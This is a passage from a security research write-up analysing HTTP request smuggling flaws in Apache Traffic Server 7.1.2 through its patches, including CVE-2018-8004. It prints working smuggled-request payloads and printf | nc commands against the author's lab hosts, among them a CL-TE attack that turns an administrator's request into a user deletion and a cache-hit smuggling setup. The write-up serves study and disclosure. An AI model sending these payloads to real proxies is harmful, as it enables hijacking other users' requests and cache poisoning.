follows:
      # 3201 Close the
> connection when returning a 400 error response
This patch shows that in ATS 7.1.2, if a request causes a 400 error, the
established TCP link will not be closed. In regilero's analysis of
CVE-2018-8004
[article](https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/),
how to exploit this vulnerability.
    printf 'GET / HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    'aa: \0bb\r\n'\
    'foo: bar\r\n'\
    'GET /2333 HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
A total of 2 responses can be obtained, all of which are 400 errors.
When ATS parses a HTTP request, if it encounters `NULL`, it will cause a
truncation operation. The one request we send is two requests for the ATS
server.
First
    GET / HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: 
Second
    bb\r\n
    foo: bar\r\n
    GET /2333 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
The first request encountered `NULL` during parsing, the ATS server responded
with the first 400 error, and the following `bb\r\n` became the beginning of
the subsequent request, not conforming to the HTTP request specification,
which responded The second 400 error.
Test with modification
    printf 'GET / HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    'aa: \0bb\r\n'\
    'GET /1.html HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
A 400 response, a 200 response, can also be seen in Wireshark, which forwards
the second request to the backend Apache server.
This is already a HTTP request splitting attack.
    GET / HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: \0bb\r\n
    GET /1.html HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
But this request package, how to see are two requests, the middle `GET /1.html
HTTP/1.1\r\n` does not conform to the format of the request header
`Name:Value` in the HTTP packet. Here we can use `absoluteURI`, which
specifies its detailed format in `5.1.2` of `RFC2616`.
> 
We can make a request using a request header like `GET
http://www.w3.org/pub/WWW/TheProject.html HTTP/1.1`.
Constructing a packet
    GET /400 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: \0bb\r\n
    GET http://ats.mengsec.com/1.html HTTP/1.1\r\n
    \r\n
    GET /404 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
    printf 'GET /400 HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    'aa: \0bb\r\n'\
    'GET http://ats.mengsec.com/1.html HTTP/1.1\r\n'\
    '\r\n'\
    'GET /404 HTTP/1.1\r\n'\
    'Host: ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
Essentially, this is two HTTP requests, the first one is
    GET /400 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    aa: \0bb\r\n
    GET http://ats.mengsec.com/1.html HTTP/1.1\r\n
    \r\n
Where `GET http://ats.mengsec.com/1.html HTTP/1.1` is a request header named
`GET http` with a value of `//ats.mengsec.com/1.html HTTP/1.1`.
The second one is
    GET /404 HTTP/1.1\r\n
    Host: ats.mengsec.com\r\n
    \r\n
After the request is sent to the ATS server, we can get three HTTP responses,
the first one is 400, the second is 200, and the third is 404. The extra
response is the ATS response to the server 1.html request.
According to the first-in-first-out rule of HTTP Pipepline, it is assumed that
the attacker sends the first malicious request to the ATS server, and then the
victim sends a normal request to the ATS server, and the response obtained by
the victim is sent by the attacker. The contents of `GET
http://evil.mengsec.com/evil.html HTTP/1.1` in the malicious request. This
type of attack is theoretically successful, but the conditions of use are
still too harsh.
For the way the vulnerability is fixed, the ATS server chooses to close the
TCP link when it encounters a 400 error, so that no matter what subsequent
requests, it will not affect other users.
#### 4.3.3 Third Patch
>  # 3231 Validate Content-> Length headers for incoming requests
In this patch, the description of bryancall is
    Respond with 400 code when Content-Length headers mismatch, remove duplicate copies of the Content-Length header with exactly same values, and remove Content-Length headers if Transfer-Encoding header exists.
From here we can know that in the ATS 7.1.2 version, there is no full
implementation of the `RFC2616` standard, we may be able to carry out the `CL-TE` smuggling attack.
Construction request
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length: 6\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    0\r\n
    \r\n
    G
Get a `405 Not Allowed` response after multiple transmissions.
We can assume that subsequent requests are combined on the Nginx server into
requests similar to the one shown below.
    GGET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    ......
For Nginx, the `GGET` request method does not exist, of course, it will return
`405` error.
Next try to attack the `admin.php`, construct the request
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length: 83\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    0\r\n
    \r\n
    GET /admin.php?del=mengchen HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
After several requests, I got the response `You are not Admin`. This indicates
that the server made a request for `admin.php`.
If the administrator is already logged in at this time, then I want to visit
the home page of the website. His request is
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    Cookie: admin=1
The effect is as follows
We can look at the traffic of Wireshark. In fact, it is still very well
understood.
The part shown by the shadow is the request sent by the administrator. In the
Nginx server, the combination is entered into the previous request, which is
equivalent to
    GET /admin.php?del=mengchen HTTP/1.1
    Host: lnmp.mengsec.com
    attack: 1
    foo: GET / HTTP/1.1
    Host: 10.211.55.2:10086
    Cookie: admin=1
    X-Forwarded-For: 10.211.55.2
    Via: http/1.1 mengchen-ubuntu[e9365059-ad97-40c8-afcb-d857b14675f6] (ApacheTrafficServer/7.1.2)
The cookie carrying the administrator has been deleted. This is actually the
same as the usage in 4.3.1 above.
#### 4.3.4 Fourth Patch
>  # 3251 Drain the request
> body if there is a cache hit
I was stunned when I saw this patch. I only know that it should be related to
the cache and did not know where the problem is until regilero's analysis
article came out on September 17th.
When the cache hits, the ATS server ignores the `Content-Length` request
header, and the data in the request body will be processed by the ATS as
another HTTP request, which leads to a request smuggling vulnerability.
Before testing, I opened the cache function of the ATS server in the test
environment, and modified the default configuration to facilitate testing.
    vim /opt/ts-712/etc/trafficserver/records.config
    CONFIG proxy.config.http.cache.http INT 1 # Enable caching
    CONFIG proxy.config.http.cache.ignore_client_cc_max_age INT 0 # Enable the client Cache-Control header to facilitate control of cache expiration time
    CONFIG proxy.config.http.cache.required_headers INT 1 # When the Cache-control: max-age request header is received, the response is cached
Then restart the ATS server.
For convenience, I wrote a script `random_str.php` that generates a random
string in the Nginx website directory.
    function randomkeys($length){ 
        $output='';
        for ($a = 0; $a<$length; $a++) {
            $output .= chr(mt_rand(33, 126));
        }   
        return $output;
    }
    echo "get random string: ";
    echo randomkeys(8);
Construction request
    GET /1.html HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Cache-control: max-age=10\r\n
    Content-Length: 56\r\n
    \r\n
    GET /random_str.php HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n